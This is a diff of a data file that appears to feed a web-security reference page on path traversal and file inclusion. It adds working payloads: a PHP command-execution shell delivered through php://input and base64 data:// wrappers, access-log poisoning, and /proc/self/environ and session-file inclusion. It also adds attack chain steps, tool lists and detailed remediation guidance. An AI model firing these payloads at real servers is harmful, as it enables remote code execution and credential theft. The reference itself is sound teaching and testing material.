+              { label: "Direct code via wrappers", cmd: "# php://input: put PHP in the POST body\nPOST ?file=php://input\n<?php system($_GET['c']); ?>\n# data:// wrapper (needs allow_url_include):\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+" },
+              { label: "Log poisoning", cmd: "# 1) send a request whose User-Agent is <?php system($_GET['c']);?>\n# 2) include the log so it executes:\n?file=/var/log/apache2/access.log&c=id\n?file=/var/log/nginx/access.log" },
+              { label: "Other includable, controllable files", cmd: "?file=/proc/self/environ          # poison via User-Agent\n?file=/tmp/sess_<PHPSESSID>        # PHP session file you can seed\n?file=/var/lib/php/sessions/sess_..\n# or include a file you uploaded through another feature" }
+            ]
+          },
+          {
+            title: "LFI vs RFI vs Wrappers",
             type: "table",
             columns: ["Variant", "Detail"],
             rows: [
-              ["LFI (read)", "Include/read a local file — source, config, /etc/passwd, keys"],
-              ["LFI to RCE", "Include a file you can control: uploaded file, poisoned log, /proc/self/environ, PHP session"],
-              ["RFI", "Include a remote URL (requires allow_url_include) — direct RCE, now rare by default"],
-              ["Wrappers", "php://filter to exfiltrate source; data:// / php://input to inject code"]
+              ["LFI (read)", "Read a local file — source, config, /etc/passwd, keys, cloud creds"],
+              ["LFI to RCE", "Include controllable content: uploaded file, poisoned log, /proc/self/environ, PHP session"],
+              ["RFI", "Include a remote URL (needs allow_url_include) — direct RCE, rare by default"],
+              ["php://filter", "Base64-exfiltrate source without executing it"],
+              ["php://input / data://", "Supply PHP code to execute"],
+              ["zip-slip / write traversal", "../ in an uploaded/extracted filename overwrites arbitrary files"]
             ]
           },
           {
-            title: "Attack Chain",
+            title: "Impact & Attack Chain",
             type: "table",
             columns: ["Step", "Action", "Result"],
             rows: [
-              ["1", "Inject ../ into a file parameter", "Read outside the base dir"],
-              ["2", "Bypass encoding/strip filters", "Reliable arbitrary file read"],
-              ["3", "Exfiltrate source/secrets (php://filter)", "Config + credential disclosure"],
-              ["4", "Include controllable content", "LFI -> RCE"]
+              ["1", "Inject ../ into a file parameter", "Read outside the base directory"],
+              ["2", "Bypass encoding / strip filters", "Reliable arbitrary file read"],
+              ["3", "Exfiltrate source & config (php://filter)", "Credentials, keys, DB config disclosed"],
+              ["4", "Include controllable content / poisoned log", "LFI -> remote code execution"],
+              ["5", "Use disclosed secrets", "Lateral movement, cloud/DB access"]
             ]
           },
           {
@@ -2536,27 +2795,32 @@ var VULNS = [
             columns: ["Tool", "Purpose"],
             rows: [
               ["Burp Suite", "Manual traversal, encoding, and wrapper testing"],
-              ["ffuf / LFISuite", "Fuzz path parameters and known LFI targets"],
-              ["dotdotpwn", "Automated traversal fuzzer across encodings"]
+              ["ffuf / Burp Intruder", "Fuzz path parameters with a traversal/LFI wordlist"],
+              ["dotdotpwn", "Automated traversal fuzzer across encodings and OSes"],
+              ["LFISuite / liffy", "Automate LFI-to-RCE (log poisoning, wrappers)"],
+              ["SecLists (LFI/traversal lists)", "Payload and target wordlists"]
             ]
           },
           {
             title: "References",
             type: "references",
             items: [
-              { label: "PortSwigger — File path traversal", url: "https://portswigger.net/web-security/file-path-traversal" },
-              { label: "PayloadsAllTheThings — File Inclusion / Path Traversal", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" }
+              { label: "PortSwigger — File path traversal (with labs)", url: "https://portswigger.net/web-security/file-path-traversal" },
+              { label: "OWASP WSTG — Testing for Local/Remote File Inclusion", url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion" },
+              { label: "OWASP — Path Traversal", url: "https://owasp.org/www-community/attacks/Path_Traversal" },
+              { label: "PayloadsAllTheThings — File Inclusion", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" }
             ]
           },
           {
             title: "Remediation",
             type: "notes",
             items: [
-              "Do not build file paths from user input. Map an input key to a fixed server-side list of allowed files instead.",
-              "If a path component is unavoidable, canonicalise it and verify the resolved path stays within the intended base directory.",
-              "Strip path separators and traversal sequences after decoding, and reject absolute paths and wrappers.",
-              "Disable dangerous include features (allow_url_include/allow_url_fopen in PHP) and run with least filesystem privilege.",
-              "Keep secrets out of web-readable locations so a read primitive yields less."
+              "Do not build filesystem paths from user input. Map an opaque input key to a fixed server-side allow-list of permitted files (e.g. {'report':'/data/report.pdf'}), and serve only from that map.",
+              "If a path component is unavoidable, canonicalise the full resolved path (realpath / Path.normalize) and verify it still starts with the intended base directory before opening it — reject otherwise.",
+              "After decoding, reject any input containing path separators, '..', null bytes, absolute paths, or scheme wrappers (php://, data://, file://, http://).",
+              "Disable dangerous PHP features: allow_url_include=Off and allow_url_fopen=Off; avoid include()/require() on any user-influenced value.",
+              "For uploads and archive extraction, sanitise entry filenames and resolve+confine the destination path to prevent write traversal / zip-slip.",
+              "Run the app with least filesystem privilege and keep secrets out of web-served directories so a read primitive yields as little as possible."
             ]
           }
         ]
